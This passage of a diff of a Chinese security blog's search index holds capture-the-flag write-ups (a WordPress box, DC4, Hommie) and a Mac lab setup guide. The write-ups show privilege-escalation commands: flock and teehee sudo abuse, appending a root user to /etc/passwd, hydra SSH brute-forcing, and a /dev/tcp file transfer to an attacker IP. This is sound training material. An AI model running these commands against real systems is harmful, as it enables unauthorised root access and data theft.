<span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>有一个注释<code>/* idrinksomewater */</code>  这个 就是用户的密码，用户在home目录有显示名称<br>查看sudo-l</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> adrian on <span class="symbol">vulny:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> adrian may run the following commands on <span class="symbol">vulny:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/flock</span><br></pre></td></tr></table></figure></div>
+<p>用flock 提权<br>在gtfobins找到提权方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure></div>
+<p>这个命令的本意是 “解锁 &#x2F; 之后执行 &#x2F;bin&#x2F;sh”，但由于 flock -u &#x2F; 没有实际影响，它相当于：<br><code>sudo /bin/sh</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/flock / /bin/bash</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="built_in">cat</span> /root/*.txt</span><br><span class="line">HMVididit</span><br></pre></td></tr></table></figure></div>
+<p>完成</p>
+<p>总结：我遇到的一些卡点：1.搜索secret目录下的二级目录 2.找到插件的漏洞利用脚本  3.用出了nc -e的另一种方法反弹shell<br>学习到了： 1.<code>python3 -m http.server</code> 开启一个http服务 让web可以用wget接收脚本  2.reverse.sh的利用，接收之后用bash执行 3.wordpress题目去&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php中看看 4.flock提权</p>
 ]]></content>
       <categories>
         <category>靶场</category>
@@ -1593,6 +1646,50 @@
       <tags>
         <tag>渗透</tag>
         <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mac环境靶场搭建</title>
+    <url>/posts/86.html</url>
+    <content><![CDATA[<p>Mac环境下靶场搭建</p>
+<span id="more"></span>
+<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
+<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
+<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
+
+<p>然后下载qemu  mac用户可以用brew下载</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
+<p>然后在靶场解压后的目录中执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
+<p>执行后把.vmdk 文件转换成.qcow2文件</p>
+<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
+<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
+<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">3</span> hosts <span class="keyword">up</span>) scanned in <span class="number">2.41</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>比如我这里这三个ip都不是靶机</p>
+<h3 id="debian系解决方案"><a href="#debian系解决方案" class="headerlink" title="debian系解决方案"></a>debian系解决方案</h3><p>这时 先关闭靶机 在启动的蓝色界面 按e进入命令行模式<br>（如果一直没有出现这个蓝色界面说明不是debian系的，在启动的时候按shift也能进入这个界面）<br>光标下移  找到ro（这里的倒数第三行） 改成rw single init&#x3D;&#x2F;bin&#x2F;bash<br>ctrl + x 进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679a51aad0e0a243d4f87be5.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be6.png"><br><img src="https://pic1.imgdb.cn/item/679a51abd0e0a243d4f87be7.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">ip <span class="keyword">a</span> <span class="comment">#查看实际使用网卡 (我这里就是enp0s1)</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be8.png"><br>然后输入 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">nano /etc/network/interfaces <span class="punctuation">#</span><span class="params">(编辑网卡)</span></span><br></pre></td></tr></table></figure></div>
+<p>这里用nano 不用vim  vim不知道为什么在这个模式下面更改不了内容<br>然后把网卡替换成实际的网卡(enp0s3 改成 enp0s1)<br><img src="https://pic1.imgdb.cn/item/679a51acd0e0a243d4f87be9.png"><br><img src="https://pic1.imgdb.cn/item/679a5210d0e0a243d4f87bf1.png"><br>ctrl + o 保存 回车确定 最后ctrl + x 退出<br>重启网络服务</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">service networking restart</span></span><br></pre></td></tr></table></figure></div>
+<p>等加载之后重启虚拟机  就发现可以扫到ip啦 (如果还是不行可以尝试把utm网络中桥接的端口从自动改成en0)<br><img src="https://pic1.imgdb.cn/item/679a5211d0e0a243d4f87bf2.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">30</span> <span class="number">00</span>:<span class="number">07</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.035</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.135</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.17</span>s latency).</span><br><span class="line">MAC Address: B6:<span class="number">9</span>C:<span class="number">5</span>D:<span class="number">4</span>F:DE:AB (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">3.69</span> seconds</span><br></pre></td></tr></table></figure></div>
+<h3 id="ubuntu系统"><a href="#ubuntu系统" class="headerlink" title="ubuntu系统"></a>ubuntu系统</h3><p>如果开机的时候一直加载进度进度条，没有出现蓝色界面，说明是ubuntu系统。<br>按shift进入命令行模式<br><img src="https://pic1.imgdb.cn/item/679dd3ddd0e0a243d4f972dc.png"><br>然后按e，把ro改成 rw single init&#x3D;&#x2F;bin&#x2F;bash 并且把这行后面的都删除，直到initrd<br><img src="https://pic1.imgdb.cn/item/679dd50ed0e0a243d4f972f2.png"><br>ctrl + x开机<br>和dibian系一样用ip a查看真实ip端口<br>不一样的是这里网卡配置文件在</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/etc/netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure></div>
+<p>修改成真实网卡（我这里3改成1）<br><img src="https://pic1.imgdb.cn/item/679dd746d0e0a243d4f97313.png"><br>ctrl + o 回车  ctrl + x 退出</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/netplan/00-installer-config.yaml </span><br></pre></td></tr></table></figure></div>
+<p>让修改后的文件生效</p>
+<p>然后重启靶机 就可以获取到靶机ip了</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>靶场配置</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1619,28 +1716,22 @@
       </tags>
   </entry>
   <entry>
-    <title>DC4靶场复盘</title>
-    <url>/posts/52100.html</url>
-    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
+    <title>HMV-Hommie</title>
+    <url>/posts/61994.html</url>
+    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
 <span id="more"></span>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
-<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
-<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
-<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
-<ul>
-<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
-<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
-</ul>
+<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
+<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>发现有三个端口  ftp ssh http<br>先看看ftp能不能匿名登录<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>尝试把反弹shell文件上传  无法得到shell<br>80端口<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>得到两个用户 alexia nobody   并且提示我们要得到alexia的id_rsa<br>目录扫描<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>使用了两个常用的目录字典都没有扫描到 说明大概率就是没有其他目录<br>web如果没有信息就说明信息收集还不过     – 重新用nmap扫描  看看有没有其他服务<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> 有新的发现  还有开放dhcpc tftp 服务<br> 根据前面的提示  get id_rsa  成功得到rsa私钥  登录到ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> 成功拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3f07d0e0a243d4f87a2e.png"><br>没有sudo指令  查suid  不一样的就是的第一个<code>/opt/showMetheKey</code><br>执行这个文件之后 发现是一个rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a2f.png"><br>这个私钥是当前用户的  我们要想办法得到root用户的<br>现在将这个文件下载到本地 <code>cat showMetheKey &gt; /dev/tcp/192.168.240.83/1234</code><br><img src="https://pic1.imgdb.cn/item/679a3f0cd0e0a243d4f87a30.png"><br>用ida分析这个程序<br><img src="https://pic1.imgdb.cn/item/679a3f80d0e0a243d4f87a3a.png"></p>
+<p>所以修改环境变量 这样子就可以得到root的rsa私钥<br><img src="https://pic1.imgdb.cn/item/679a3f73d0e0a243d4f87a33.png"><br><img src="https://pic1.imgdb.cn/item/679a3f7ad0e0a243d4f87a38.png"><br>成功登录到root<br><img src="https://pic1.imgdb.cn/item/679a3f7fd0e0a243d4f87a39.png"></p>
 ]]></content>
       <categories>
         <category>靶场</category>
-        <category>vulnhub</category>
+        <category>hmv</category>
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>vulnhub</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -1685,47 +1776,6 @@
       <tags>
         <tag>渗透</tag>
         <tag>HMV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mac环境靶场搭建</title>
-    <url>/posts/86.html</url>
-    <content><![CDATA[<p>Mac环境下靶场搭建</p>
-<span id="more"></span>
-<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
-<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
-<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
-
-<p>然后下载qemu  mac用户可以用brew下载</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
-<p>然后在靶场解压后的目录中执行</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
-<p>执行后把.vmdk 文件转换成.qcow2文件</p>
-<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
-<p>接着就可以启动虚拟机了<br>启动成功的画面:<br><img src="https://pic1.imgdb.cn/item/679a4de8d0e0a243d4f87ba6.png"></p>
-<h2 id="靶机没有分配到ip解决方案"><a href="#靶机没有分配到ip解决方案" class="headerlink" title="靶机没有分配到ip解决方案"></a>靶机没有分配到ip解决方案</h2><p>靶机启动后  nmap扫描当前网段发现主机ip 但是有的靶机没有分配到靶机<br>这是由于靶机中的使用的网卡和其配置文件中的网卡不匹配导致的</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~]</span><br><span class="line">└─# <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">240.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">01</span>-<span class="number">29</span> <span class="number">23</span>:<span class="number">50</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.0049</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>E:CB:C5:<span class="number">05</span>:B8:<span class="number">1</span>B (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00041</span>s latency).</span><br><span class="line">MAC Address: <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span 